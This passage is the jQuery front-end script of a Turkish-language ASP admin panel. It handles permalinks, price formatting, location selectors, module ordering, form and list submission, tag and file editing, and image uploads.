	$(".url_status:not(.noClick,.list-active-icon)").live("click", function(e){
		e.preventDefault();

		var $this = $(this);
		var URL = $this.attr("href") + GlobalDebug;

		$.ajax({
			cache: false,
			type: "POST",
			url: URL,
			data: {},
			beforeSend: function() {
				window.parent.Messages("loading", "Permalink değiştiriliyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				window.parent.ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {
				if(o == "checked") {
					setTimeout(function(){

						window.parent.Messages("success", "Permalink diğeriyle değiştirildi.");

						$(".url_status").removeClass("list-active-icon").addClass("list-passive-icon");
						$this.removeClass("list-passive-icon").addClass("list-active-icon");
					}, 800);
				}
			}

		});
	});


	$("input.UrlSaveSubmit").live("keyup", function(e){
		e.preventDefault();
		var intUrlid = /url_(\d+)/.exec($(this).attr("id"))[1];
		if(e.which == 13) {
			$("a#url_save\\\[" + intUrlid + "\\\]").click();
		}
		window.onbeforeunload = null;
	});


	$(".url_save").live("click", function(e){
		e.preventDefault();
		var $this = $(this);
		var intUrlid = /url_save\[(\d+)\]/.exec($(this).attr("id"))[1];
		var strHref = $(this).attr("href");
		var input_id = $("#url_" + intUrlid);
		if (input_id.val() === "") {
			window.parent.Messages("error", "Lütfen permalink alanını doldurun.");
			return false;
		}
		$.ajax({
			cache: false,
			dataType: "json",
			type: "POST",
			contentType: "application/x-www-form-urlencoded; charset=UTF-8",
			url: strHref,
			data: {"url_value" : input_id.val()},
			beforeSend: function() {
				window.parent.Messages("loading", "Permalink kaydediliyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				window.parent.ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {
				setTimeout(function(){
					if ($this.attr("id") === "url_save[0]") {
						var $status_href = $("#url_status\\\[0\\\]").attr("href").replace(/\id=0/gi, "id=" + o.uid);
						$("#url_status\\\[0\\\]").attr("id", "url_status\[" + o.uid + "\]").attr("href", $status_href);

						var $save_href = $("#url_save\\\[0\\\]").attr("href").replace(/\id=0/gi, "id=" + o.uid);
						$("#url_save\\\[0\\\]").attr("id", "url_save\[" + o.uid + "\]").attr("href", $save_href);

						$("label[for='url_0']").attr("for", "url_" + o.uid);
						$("#url_0").attr("id", "url_" + o.uid);

						$(".url_status").removeClass("list-active-icon noClick").addClass("list-passive-icon");
						$("#url_status\\\[" + o.uid + "\\\]").removeClass("list-passive-icon").addClass("list-active-icon");
					}
					$("#url_" + o.uid).val( o.url );

					window.parent.Messages(o.cssClass, o.Msg);
				}, 800);
			}
		});
	});















/*
############################## Ürün Fiyat Format Ayarları ##############################
*/

	// Ürün fiyat formatı
	var pFrmt = $("#price");
	if (pFrmt.length > 0) {
		pFrmt.priceFormat({
			prefix: "",
			centsSeparator: ",", 
			thousandsSeparator: ".",
			limit: false,
			centsLimit: 2
		});
	}







/*
############################## Takvim ##############################
*/





	// Takvim
	var dPicker = $("input.date");
	if(dPicker.length > 0){
		dPicker.datepicker({
			showOn: "button",
			buttonImage: "images/calendar-month.png",
			buttonImageOnly: true
		})
	}









/*
############################## İl İlçe Semt Seçici ##############################
*/


	//İl İlçe Semt işlemleri //$("#il, #ilce, #til, #tilce, #fil, #filce")
	$(".select_location").live("change", function() {
		var sid = $(this).attr("id");
		var task = sid.replace($(this).attr("data-prefix"), "");
		var sval = $(this).val();
		var sprefix = $(this).attr("data-prefix");
		var ilce = $("#" + sprefix + "ilce");
		var semt = $("#" + sprefix + "semt");
		var yukleniyor = "<option value=\"\">Yükleniyor...</option>'";
		var seciniz = "<option value=\"\">Seçiniz</option>";
		//$("select:not(.notSelectBox)").selectBox('destroy');
		$.ajax({
			cache: false,
			type: "POST",
			url: "index.asp?mod=redirect&task=" + task + "&id=" + sval + GlobalDebug,
			data: {},
			beforeSend: function() {
				switch (task) {
					case "il":
						ilce.empty().append(yukleniyor).stop(true, true).selectBox("refresh");
						semt.empty().append(seciniz).stop(true, true).selectBox("refresh");
					break;

					case "ilce":
						semt.empty().append(yukleniyor).stop(true, true).selectBox("refresh");
					break;
				}
			},
			error: function(xhr, ajaxOptions, thrownError) {
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(msg) {
				setTimeout(function() {
					switch (task) {
						case "il":
							ilce.empty().append(msg).stop(true, true).selectBox("refresh");
							semt.empty().append(seciniz).stop(true, true).selectBox("refresh");
						break;

						case "ilce":
							semt.empty().append(msg).stop(true, true).selectBox("refresh");
						break;
					}
					
				}, 800);
			}
		});
	});










/*
############################## Modül Yerleşim Ayarları Ayarları ##############################
*/




	/* Modül işlemleri */
	$(".modules_window_open").click(function(e){
		e.preventDefault();
		$(this).colorbox({title: "Modül Yerleşim Ekranı", innerWidth:850, height:"100%", iframe:true});
	});





	var $ModulesSortable = $("ul.modules:not(.noSortable)");
	if($ModulesSortable.length > 0){
		$ModulesSortable.addClass("ui-corner-all")
			.sortable({
				connectWith: "ul",
				cursor: "move",
				opacity: 0.5,
				revert: true,
				start: function(e, ui) {
					//parent = ( ui.item.next()[0] == ui.placeholder[0] ) ? ui.item.next() : ui.item;
					//alert(ui.item.next())
					/*var r = $(".x_left.r").find("ul"), l = $(".x_left").eq(0).find("ul");
					if(r.length > 0 && l.length > 0) {
						if(parseInt(l.height()) > parseInt(r.height())) {
							r.height(l.height());
						} else {
							l.height(r.height());
						}
					}*/
				},
				update: function(e, ui) {
					var order = $(this).sortable("serialize") + "&data=" + $(this).attr("data"); //alert(order)
					$.ajax({
						cache: false,
						type: "POST",
						dataType: "json",
						url: "?mod=redirect&task=modules_order" + GlobalDebug,
						data: order,
						beforeSend: function() {
							window.parent.Messages("loading", "Modül yerleri ayarlanıyor, lütfen bekleyin.");
						},
						error: function(xhr, ajaxOptions, thrownError) {
							window.parent.ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
						},
						success: function(o) {
							setTimeout(function() {
								window.parent.Messages(o.cssClass, o.txtMsg);
							}, 800);
						}
					});
				},
				stop: function(e, ui) {
					/*var r = $(".x_left.r").find("ul"), l = $(".x_left").eq(0).find("ul");
					if(r.length > 0 && l.length > 0) {
						if(parseInt(l.height()) > parseInt(r.height())) {
							r.height(l.height());
						} else {
							l.height(r.height());
						}
					}*/
					enable_input($ModulesSortable);
				}
			})
			.find("li").addClass("ui-corner-all")
			.click(function() {
				$(this).toggleClass("selected")
			})
			.disableSelection()
		;
	}
	enable_input($ModulesSortable);








	$(".modul_status").live("click", function(e){
		e.preventDefault();
		var $this = $(this);
		var $id = /modul_id_(\d+)/.exec($this.parents("li").attr("id"))[1]; //alert($id)
		$.ajax({
			cache: false,
			type: "POST",
			dataType: "json",
			url: "?mod=redirect&task=modul_status&id=" + $id + GlobalDebug,
			data: {},
			beforeSend: function() {
				window.parent.Messages("loading", "Modül durumu değiştiriliyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				window.parent.ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {
				setTimeout(function() {
					window.parent.Messages(o.cssClass, o.txtMsg);
					$this.toggleClass("checked")
				}, 800);
			}
		});
	});



















/*
############################## From Post Submit Ayarları ##############################
*/


/*
var strinput = $("input");
if(strinput.length > 0){
	strinput.keypress(function(e){
		if(e.which == 13) {
			$("#EnergyAdminForm").submit();
		}
	});
}
*/

// Ajax Json New Or Edit Form Post
/*
$(".mce_save").bind("click", function(e){
	e.preventDefault();
	$("#EnergyAdminForm").submit();
});*/


$("#form_submit").click(function(e){
	e.preventDefault();
	$("#EnergyAdminForm").submit();
});


$("#EnergyAdminForm").submit(function(e) {
	//e.preventDefault();
	var $this = $(this);
	TinymceTriggerSave();
	$("#file_list").find("input, select, textarea").attr("disabled", "disabled");
	
	//$("#description_TR").append($this.serialize()); return false;
	$.ajax({
		cache: false,
		dataType: "json",
		type: "POST",
		contentType: "application/x-www-form-urlencoded; charset=UTF-8",
		url: $this.attr("action"),
		data: $this.serialize(),
		beforeSend: function() {
			Messages("loading", "Veriler kaydediliyor, lütfen bekleyin.");
		},
		error: function(xhr, ajaxOptions, thrownError) {
			sysMsg.bind(".close").click();
			ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
		},
		success: function(oData) { //$('#s_text_TR').append(oData); return false;
			$("#pageid").val(oData.siD);
			var arr = oData.sMsg.split(" {---} ");
			setTimeout(function(){
				Messages(oData.sClass, arr[0]);
			}, 800);

			if(oData.siD > 0) {
				$(".pageinfo").find("small").html(" &raquo; Kayıt düzenle");
				if(SpanPageNoWrite){ $("span#pgid").text(oData.siD); }
				//if(RefreshPage){ window.location.reload( true ); }
				if(RefreshPage) {
					var secenek_input = $("input[name=\"secenekid[]\"]");
					var arrS = arr[1].split(", ");
					for (x in arrS) {
						secenek_input.eq(x).val(arrS[x]);
						//alert(arrS[x])
					}
				}
			}
			//$(window).unbind("beforeunload");
			window.onbeforeunload = null;
			$("#file_list").find("input, select, textarea").removeAttr("disabled");
		}
	});
	return false;
});





$("#EnergyAdminList input[name='order\[\]']").keypress(function(e) {
	if (e.which == 13) {
		$("a[data-status='sort-order']").click();
		e.preventDefault();
	}
});





// Ajax Json List Form Post
$(".taskListSubmit").live("click", function(e){
	e.preventDefault();
	var $this = $(this);
	var $form = $("#EnergyAdminList");
	var $number = $this.attr("data-number");
	var $status = $this.attr("data-status");
	var $apply = $this.attr("data-apply");
	//alert($this)
	if ($number != "multi-selected" && $status == "delete") {
		var r = confirm("Dikkat! #" + (eval($number) + 1) + " Numaralı kayıt silinecektir. Devam edilsin mi?");
		if (r != true) {return false;}
	}

	if ($number == "multi-selected") {
		$form.find("select").attr("disabled", "disabled");
	} else {
		$form.find("input").attr("disabled", "disabled");
		$form.find("select").attr("disabled", "disabled");
	}

	if ($number == "multi-selected" && $status == "sort-order") {
		$form.find("input#toggle").attr("checked", "checked").click();
	}

	if ($number == "multi-selected" && eval($("#boxchecked").val()) == 0) {
		Messages("warning", "İşlemin gerçekleşebilmesi için kayıt seçmelisiniz.");
		return false;
	}

	if(isNumeric($number)){
		isChecked($number);
		$form.find("#cb" + eval($number))
			.removeAttr("disabled")
			.attr("checked", "checked")
			.parents("tr")
			.addClass("active")
		;
	}

	$("#boxchecked").removeAttr("disabled").val( $status );

	var $formAction = "?mod=list_post&task=" + GlobalModValue + GlobalLangValue + GlobalDebug;
	var $formData = $form.serialize().replace(/%5B/gi, "[").replace(/%5D/gi, "]") + "&apply=" + $apply;

	$.ajax({
		cache: false,
		dataType: "json",
		type: "POST",
		url: $formAction,
		data: $formData,
		beforeSend: function() {
			Messages("loading", "İşlem yapılıyor, lütfen bekleyin.");
		},
		error: function(xhr, ajaxOptions, thrownError) {
				sysMsg.bind(".close").click();
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
		},
		success: function(Ojson) { //alert(Ojson)
			$.each(Ojson.List, function(key, oData) {

				if (oData.sOlay === "frontpage-true") {
					$("#a"+ oData.siD).find("a").addClass("list-active-icon").removeClass("list-passive-icon");
				}
				else if (oData.sOlay === "frontpage-false") {
					$("#a"+ oData.siD).find("a").addClass("list-passive-icon").removeClass("list-active-icon");
				}

				if (oData.sOlay === "status-true") {
					if (oData.sUrl === "#" || oData.sUrl === "" || oData.sUrl === "null" || oData.sUrl === null) {
						$("#u" + oData.siD).html(oData.sTitle);
					} else {
						$("#u" + oData.siD).html("<a href=\"" + oData.sUrl + "\" title=\"" + oData.sTitle + "\" target=\"_blank\">" + oData.sTitle + "</a>");
					}
					$("#d" + oData.siD).find("a").addClass("list-active-icon").removeClass("list-passive-icon");
				}
				else if (oData.sOlay === "status-false") {
					$("#u" + oData.siD).html("<span class=\"status-false\">" + oData.sTitle + "</span>");
					$("#d" + oData.siD).find("a").addClass("list-passive-icon").removeClass("list-active-icon");
				}

				if (oData.sOlay === "delete-true" && Ojson.AddClass === "success") {
					$("#trid_" + oData.siD)
					.find("td")
					.wrapInner("<div style=\"display:block;\" />")
					.parent()
					.find("td > div")
					.parent()
					.animate({
						"color" : "#fff",
						"background-color" : "#ff6767"
					}, 800, function(){ $(this).slideUp(800, function(){ $(this).parent().remove() }) });
				}
			});

			setTimeout(function(){
				Messages(Ojson.AddClass, Ojson.Message);
			}, 1000);

			$form.find("input").removeAttr("disabled").removeAttr("checked");
			$form.find("select").removeAttr("disabled");
			$(".row1, .row2").removeClass("active");

		}
	});
	$form.find("#boxchecked").val( 0 );
	window.onbeforeunload = null;
	return false;
//}

});























$("#etiket_save").live("submit", function(e) {
	e.preventDefault();
	var $this = $(this);
	var appendClass = "";
	var $loading = $("#save-loading");
	$loading.css("display", "inline");
	var $etiket_list = $("#etiket_list");
	var $etiket_list_tbody = $etiket_list.find("tbody");
	var $etiket_list_len = $etiket_list_tbody.find("> tr").length;
	//alert($this.serialize())
	$.ajax({
		cache: false,
		dataType: "json",
		contentType: "application/x-www-form-urlencoded; charset=UTF-8",
		type: $this.attr("method"),
		url: $this.attr("action"),
		data: $this.serialize(),
		beforeSend: function() {
			Messages("loading", "Etiket kaydediliyor, lütfen bekleyin.");
		},
		error: function(xhr, ajaxOptions, thrownError) {
			ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
		},
		success: function(o) {
			if(o.etiket_id > 0) {
				var html = '';
				html += '<td><label style="display:block;" for="cb'+ $etiket_list_len +'">'+ ($etiket_list_len + 1) +'</label></td>';
				html += '<td><input id="cb'+ $etiket_list_len +'" onclick="isChecked(0);" name="postid[]" value="'+ o.etiket_id +'" type="checkbox"></td>';
				html += '<td class="left"><div style="display:inline;" id="u'+ o.etiket_id +'">';
					if (o.status == 1) {
						html += '<a href="'+ o.permalink +'" title="" target="_blank">'+ o.etiket +'</a>';
					} else {
						html += '<span class="status-false" title="">'+ o.etiket +'</span>';
					}
				html += '</div></td>';

				html += '<td>'+ o.etiket_id +'</td>';

				if (o.status == 1) {appendClass = "list-active-icon";} else {appendClass = "list-passive-icon";}

				html += '<td id="d'+ o.etiket_id +'"><a class="'+ appendClass +' taskListSubmit" data-number="'+ $etiket_list_len +'" data-status="status" data-apply="" title="Aktif/Pasif Yap">Aktif/Pasif Yap</a></td>';
				html += '<td><a class="list-edit-icon EditEnergyTag" href="#" title="Düzenle">Düzenle</a></td>';
				html += '<td><a class="list-delete-icon taskListSubmit" data-number="'+ $etiket_list_len +'" data-status="delete" data-apply="" title="Kalıcı Olarak Sil">Kalıcı Olarak Sil</a></td>';

				if($('#trid_'+ o.etiket_id).length == 0) {
					$etiket_list_tbody.prepend('<tr id="trid_'+ o.etiket_id +'" />');
				}
				var $bgColor = $etiket_list_tbody.find("#trid_"+ o.etiket_id).css("background-color");

				$etiket_list_tbody.find("#trid_"+ o.etiket_id)
				.animate({"background-color" : "#fff1a3"}, 1000)
				.delay(2000)
				.animate({"background-color" : $bgColor}, 2000, function(){$(this).removeAttr("style")})
				.html(html);

				$.each($etiket_list_tbody.find("> tr"), function(i) {
					if (i % 2 == 0) {appendClass = "row1";} else {appendClass = "row2";}
					$(this).removeClass("row1 row2").addClass(appendClass);
					$(this).find("label").attr("for", "cb" + i).text((i + 1));
					$(this).find("input").attr({"id" : "cb" + i, "onclick" : "isChecked(" + i + ");"});
					$(this).find("a").attr("data-number", i);
				});
			}
			setTimeout(function() {
				Messages(o.cssClass, o.mesaj);
				$loading.css("display", "none");
			}, 1000);
		}
	});

	setTimeout(function() {
		$loading.css("display", "none");
		$("#EditEnergyTagFormReset").click();
	}, 800);

	window.onbeforeunload = null;
});






$(".EditEnergyTag").live("click", function(e){
	e.preventDefault();
	var $id = $(this).parent().parent().attr("id").replace("trid_", "");
	var $etiket_form = $("#etiket_save");
	$.ajax({
		cache: false,
		dataType: "json",
		contentType: "application/x-www-form-urlencoded; charset=UTF-8",
		type: "POST",
		url: "?mod=redirect&task=" + GlobalModValue + "&id=" + $id + GlobalDebug,
		beforeSend: function() {
			//Messages("loading", "Lütfen bekleyin.");
		},
		error: function(xhr, ajaxOptions, thrownError) {
			ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
		},
		success: function(o) {
			$etiket_form.find("input[name=pageid]").val(o.idno);
			$etiket_form.find("input[name=title_]").val(o.etiket);
			$etiket_form.find("input[name=permalink]").val(o.permalink);
			
			if(o.status == 1) {
				$etiket_form.find("input[name=durum]").attr("checked", "checked");
			} else {
				$etiket_form.find("input[name=durum]").removeAttr("checked");
			}
			//alert(o.robots_meta)
			$etiket_form.find("textarea[name=description]").val(o.description);
			$etiket_form.find("textarea[name=keywords]").val(o.keywords);
			//$etiket_form.find("select[name=robots_meta] > option").removeAttr("selected");
			//$etiket_form.find("select[name=robots_meta]").selectBox("refresh");
			$.each($etiket_form.find("select[name=robots_meta] > option"), function(i) {
				if ($(this).attr("value") == o.robots_meta) {
					$(this).attr("selected", "selected");
				} else {
					$(this).removeAttr("selected");
				}
			});

			$etiket_form.find("select[name=robots_meta]").selectBox("refresh");

			sysMsg.bind(".close").delay(200).click();
		}
	});
});



$("#EditEnergyTagFormReset").live("click", function(e){
	e.preventDefault();
	var $etiket_form = $("#etiket_save");
	$etiket_form.find("input[name=pageid]").val("0");
	$etiket_form.find("input[name=title_]").val("");
	$etiket_form.find("input[name=permalink]").val("");
	$etiket_form.find("input[name=durum]").removeAttr("checked");
	$etiket_form.find("textarea[name=description]").val("");
	$etiket_form.find("textarea[name=keywords]").val("");
	$etiket_form.find("select[name=robots_meta] > option").removeAttr("selected");
	$etiket_form.find("select[name=robots_meta]").selectBox("refresh");
	window.onbeforeunload = null;
});




/*
############################## File Ayarları ##############################
*/


	/* image Files Code */
	$(".editFile, .other_file_edit").live("click", function(e){
		e.preventDefault();
		//alert($(this).hasClass("editFile")); return false;
		if($(this).hasClass("other_file_edit")) {
			var $id = $(this).parent().attr("id").replace("other_file_id_", ""), p = "otherFiles";
		} else {
			var $id = $(this).parent().parent().attr("id").replace("image-id_", ""), p = "imageFiles";
		}
		//if($("#appTo").html() === ""){
			$.post("?mod=load&task=files" + GlobalDebug, {"p" : p}, function(h) {
				$("#appTo").html(h);
			});
		//}
		$.ajax({
			cache: false,
			dataType: "json",
			contentType: "application/x-www-form-urlencoded; charset=UTF-8",
			type: "POST",
			url: "?mod=fileUpdate&id=" + $id + GlobalDebug,
			data: {},
			success: function(o) {
				$("#appTo").find(".medium_image").attr("src", "../" + o.fileSrc);
				$.colorbox({
					title: "Dosya bilgilerini düzenle",
					html:
						$("#appTo").html()
						.replace(/%7B/gi, "{")
						.replace(/%7D/gi, "}")
						.replace(/\{id\}/gi, o.fileid)
						.replace(/\{fileName\}/gi, o.fileName)
						.replace(/\{fileDateTime\}/gi, o.fileDateTime)
						.replace(/\{fileMimeType\}/gi, o.fileMimeType)
						.replace(/\{fileTitle\}/gi, o.fileTitle)
						.replace(/\{fileAlt\}/gi, o.fileAlt)
						.replace(/\{fileText\}/gi, o.fileText)
						.replace(/\{fileStyle\}/gi, o.fileStyle)
						.replace(/\{fileUrl\}/gi, o.fileUrl)
						.replace(/\{fileDefafult\}/gi, o.fileDefafult)
						.replace(/\{fileStatus\}/gi, o.fileStatus)
						.replace(/\{fileThumbPath\}/gi, o.fileThumbPath)
						.replace(/\{fileMediumPath\}/gi, o.fileMediumPath)
						.replace(/\{fileLargePath\}/gi, o.fileLargePath)
						.replace(/\=\"\"/gi, ""),
					innerWidth: 620,
					innerHeight:390
				});
				$("#appTo").empty();
			}
		});
	});


	$("form#fileUpdateSubmit").live("submit", function(e){
		e.preventDefault();
		var $this = $(this);
		//var imgid = $(this).attr("id").replace("submit-", "");
		//alert($this.serialize()); return false;
		$this.find("#fileResult").css("display", "none").empty();
		$this.find(".loading_img").css("display", "inline");
		$.ajax({
			cache: false,
			dataType: "json",
			contentType: "application/x-www-form-urlencoded; charset=UTF-8",
			type: $this.attr("method"),
			url: $this.attr("action") + GlobalDebug,
			data: $this.serialize(),
			error: function(xhr, ajaxOptions, thrownError) {
				//$.colorbox({title: "Hay aksi! işlem yapılırken bir hata oluştu.", html: xhr.responseText, innerWidth: 700, innerHeight:400});
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {
				var fileTitle = o.fileTitle, fileAlt = o.fileAlt, fileUrl = o.fileUrl, fileText = o.fileText;
				if(fileTitle == null){title = ""}
				if(fileAlt == null){alt = ""}
				if(fileUrl == null){link = ""}
				if(fileText == null){text = ""}
				$this.find("input[name=fileTitle]").val(fileTitle)
				$this.find("input[name=fileAlt]").val(fileAlt)
				$this.find("input[name=fileUrl]").val(fileUrl)
				$this.find("textarea[name=fileText]").val(fileText)
				setTimeout(function(){
					$this.find("#fileResult").css("display", "block").html(o.fileMessage);
					$this.find(".loading_img").css("display", "none");
				}, 1000);
			}
		});
	});


	$(".editorAppendFile").live("click", function(e){
		e.preventDefault();
		var $img = $(this).parent().parent().find("img");
		jInsertEditorText(
			"<img src=\"" + $img.attr("src").replace("/thumb/", "/medium/") + "\" title=\""+ $img.attr("title") +"\" alt=\""+ $img.attr("alt") +"\" />",
			$("#tabs .ui-state-active").attr("id").replace("editorid_", "text_")
		);
	});


	$(".defaultFile, .featuredFile").live("click", function(e){
		e.preventDefault();
		var $this = $(this),
		$parentUL = $this.parents("ul"),
		$id = $this.parents("li").attr("id");
		$("#files-error").hide("blind").empty();
		var $featured = 0;
		if($this.hasClass("featuredFile")) {$featured = 1;}
		//alert("?mod=redirect&task=" + GlobalModValue + "_defaultFile&id=" + $id + "&lang=" + $lang.replace("files_", "") + GlobalDebug)
		$.ajax({
			cache: false,
			type: "POST",
			url: "?mod=redirect&task=" + GlobalModValue + "_defaultFile&id=" + $id.replace(/image\-id\_/i, "") + "&lang=" + $parentUL.attr("data_lang") + GlobalDebug,
			data: {"featured" : $featured},
			error: function(xhr, ajaxOptions, thrownError) {
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {//alert(o)
				o = eval(o);
				if($featured == 1 && o == 0) {
					$this.removeClass("checked");

				} else if($featured == 1 && o == 1) {
					$this.addClass("checked");

				} else if($featured == 0 && o == 0) {
					$this.removeClass("checked");

				} else if($featured == 0 && o == 1) {
					$("#" + $parentUL.attr("id")).find(".defaultFile").removeClass("checked");
					$this.addClass("checked");
				}
				
				//$("#" + $id).find(".defaultFile, .featuredFile").removeClass("checked");
				//if(o != 0){}
			}
		});
	});


	$(".statusFile").live("click", function(e){
		e.preventDefault();
		var _this = $(this),
		lang = _this.parent().parent().parent().attr("id"),
		lang_id = lang.replace("files_", ""),
		id = eval(_this.parent().parent().attr("id").replace("image-id_", ""));
		$("#files-error").hide("blind").empty();
		$.ajax({
			cache: false,
			type: "POST",
			url: "?mod=redirect&task=" + GlobalModValue + "_status&id=" + id + "&lang=" + lang_id + GlobalDebug,
			data: {},
			error: function(xhr, ajaxOptions, thrownError) {
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {
				if(eval(o) == 1) {
					_this.addClass("checked").attr("title", "Resmi Pasif Yap")
				} else {
					_this.removeClass("checked").attr("title", "Resmi Aktif Yap")
				}
			}
		});
	});


	$(".deleteFile, .other_file_delete").live("click", function(e){
		e.preventDefault();
		var r = confirm("Bu dosya kalıcı olarak silinsin mi?");
		if (r != true) {return false;}

		if($(this).hasClass("other_file_delete")) {
			var $id = $(this).parent().attr("id").replace("other_file_id_", "");
			var parent = $(this).parent();
		} else {
			var $id = $(this).parent().parent().attr("id").replace("image-id_", "");
			var parent = $(this).parent().parent();
		}

		$("input#resim").val("");
		$("#status").hide("blind").removeClass("error").empty();
		$.ajax({
			cache: false,
			dataType: "json",
			contentType: "application/x-www-form-urlencoded; charset=UTF-8",
			type: "POST",
			url: "index.asp?mod=redirect&task=" + GlobalModValue + "_fileDelete&id=" + $id + GlobalDebug,
			data: {},
			beforeSend: function() {
				Messages("loading", "İşlem yapılıyor, lütfen bekleyin.");
			},
			error: function(xhr, ajaxOptions, thrownError) {
				sysMsg.bind(".close").click();
				ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
			},
			success: function(o) {//alert(veri)
				setTimeout(function(){
					parent.slideUp("blind", function(){ $(this).remove(); });
					Messages(o.cssClass, o.Msg);
				}, 500);
			}
		});
	});







	var OtherFileSort = $("#other_files ul");
	if(OtherFileSort.length > 0){
		OtherFileSort.sortable({
			connectWith: "ul",
			cursor: "move",
			opacity: 0.5,
			zIndex:5000,
			revert: true,
			start: function() {
				Messages("loading", "İşlem yapılıyor, lütfen bekleyin.");
			},
			stop: function() {sysMsg.bind(".close").click();},
			update: function() {
				var order = $(this).sortable("serialize") + "&lang=" + $(this).attr("data_lang");
				$.ajax({
					cache: false,
					dataType: "json",
					contentType: "application/x-www-form-urlencoded; charset=UTF-8",
					type: "POST",
					url: "?mod=redirect&task=otherFileOrder" + GlobalDebug,
					data: order,
					error: function(xhr, ajaxOptions, thrownError) {
						sysMsg.bind(".close").click();
						ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
					},
					success: function(o) {//alert(veri)
						setTimeout(function(){
							Messages(o.cssClass, o.Msg);
						}, 800);
					}
				});
			}
		});
	}



	var imgFileSort = $(".image_files:not(.noSortable)");
	if(imgFileSort.length > 0){
		imgFileSort.addClass("ui-corner-all")
			.sortable({
				connectWith: "ul",
				cursor: "move",
				opacity: 0.5,
				zIndex:5000,
				cancel : ".icons",
				handle: ".img",
				placeholder: "ph",
				revert: true,
				start: function() {
					Messages("loading", "Sıralama ayarlanıyor...");
				},
				stop: function() {sysMsg.bind(".close").click();},
				update: function() {
					var order = $(this).sortable("serialize") + "&lang=" + $(this).attr("data_lang");
					$.ajax({
						cache: false,
						dataType: "json",
						contentType: "application/x-www-form-urlencoded; charset=UTF-8",
						type: "POST",
						url: "?mod=redirect&task=imgFileOrder" + GlobalDebug,
						data: order,
						error: function(xhr, ajaxOptions, thrownError) {
							sysMsg.bind(".close").click();
							ErrorMessages("Hay aksi! işlem yapılırken bir hata oluştu.", xhr.responseText);
						},
						success: function(o) {//alert(veri)
							setTimeout(function(){
								Messages(o.cssClass, o.Msg);
							}, 800);
						}
					});
				}
			})
			.find("li").addClass("ui-corner-all")
			.disableSelection()
		;
	}











	var UploadButton = $("div#upload"), status = $("div#status"), interval;
	if(UploadButton.length > 0){
		new AjaxUpload(UploadButton, {
			action: "index.asp?mod=upload&task=" + GlobalModValue + GlobalPageNo + GlobalLangValue + GlobalDebug,
			name: "upload_img",
			multi: UploadLimit,
			//accept: "image",
			responseType: "json",
			onSubmit: function(file, ext) {
				Messages("loading", "Yükleniyor, lütfen bekleyin.");
			},
			onComplete: function(file, response) {
				//$('#description_TR').append(response);

				$.each(response, function(key, u) {//alert(u.cssStatusClass)
					if (u.cssStatusClass === "success") {
						$("ul#files_").empty();
						$("input#pageid").val(u.PageiD);

						if(SpanPageNoWrite){ $("span#pgid").text(u.PageiD) }

						var inputResim = $("input#images");
						if(inputResim.length > 0){ inputResim.val(u.FileName) }

						if (key == "0" && GlobalModValue != "ayar") { $("#form_submit").click(); $.cookie("locale_lang", null); }

						var floders = u.FolderName.replace(/\/thumb/gi, "/");

						var html = "";
						html += '<li id="image-id_'+ u.FileiD +'" class="'+ u.cssStatusClass +'">';
							html += '<div class="icons tooltip">';
								if (UploadLimit) {
									html += '<span class="defaultFile'+ u.cssDefaultClass +'" title="Varsayılan Görsel"><em>&nbsp;</em></span>';
									html += '<span class="editorAppendFile" title="Yazıya Dahil Et"><em>&nbsp;</em></span>';
									html += '<span class="editFile" title="Düzenle"><em>&nbsp;</em></span>';
									html += '<span class="statusFile checked" title="Pasif Yap"><em>&nbsp;</em></span>';
								}
								html += '<span class="deleteFile" title="Kalıcı Olarak Sil"><em>&nbsp;</em></span>';
							html += '</div>';
							if (UploadLimit) {
								html += '<div class="icons icon_bottom tooltip">';
									html += '<span class="featuredFile" title="Öne Çıkarılmış Görsel"><em>&nbsp;</em></span>';
								html += '</div>';
							}
							html += '<div class="img">';
								html += '<a rel="img-show" href="'+ (floders + u.FileName).replace(/\/{2,}/gi, "/") +'" title="'+ u.FileTitle +'">';
									html += '<img src="'+ (u.FolderName + '/').replace(/\/{2,}/gi, "/") + u.FileName +'" title="'+ u.FileTitle +'" alt="'+ u.FileAlt +'"'+ u.cssStyle +' />';
								html += '</a>';
							html += '</div>';
						html += '</li>';

						$("#files_" + u.Lng).append(html);
						$("html, body").animate({scrollTop: $("#image-id_"+ u.FileiD).offset().top-50}, 1500);

					} else {

						var errorid = status.find(".error").length;
						var html = '';
						html += '<div class="error" id="status_img_error_' + (errorid * 20) + (errorid * 40) + (errorid * 80) + '">';
						html += '<span class="clearfix">&nbsp;';
						html += '<a style="float:right; font-weight:normal;" href="#" onclick="$(this).parents(\'.error\').slideUp(800, function(){$(this).remove()}); return false;">Kapat</a>';
						html += '<b>Hay aksi! Dosya yüklenirken hata oluştu.</b>';
						html += '</span>';
						if (u.FileName != '') {
							html += '<span class="text clearfix" style="font-size:11px; color:#414141">';
							html += '<b>Orjinal Dosya ismi:</b>';
							html += '<span class="blue"><b>&ldquo;' + u.FileName + '&rdquo;</b></span>';
							html += '</span>';
						}
						html += '<span class="text clearfix">';
						html += '<span class="red" style="font-size:11px; color:#414141">';
						html += '<b>Sebep:</b> ' + u.Msg;
						html += '</span>';
						html += '</span>';
						html += '</div>';

						status.append( html );

						sysMsg.bind(".close").delay(500).click();
					}
				});

				//UploadButton.html('<span>Resim Seç</span>');
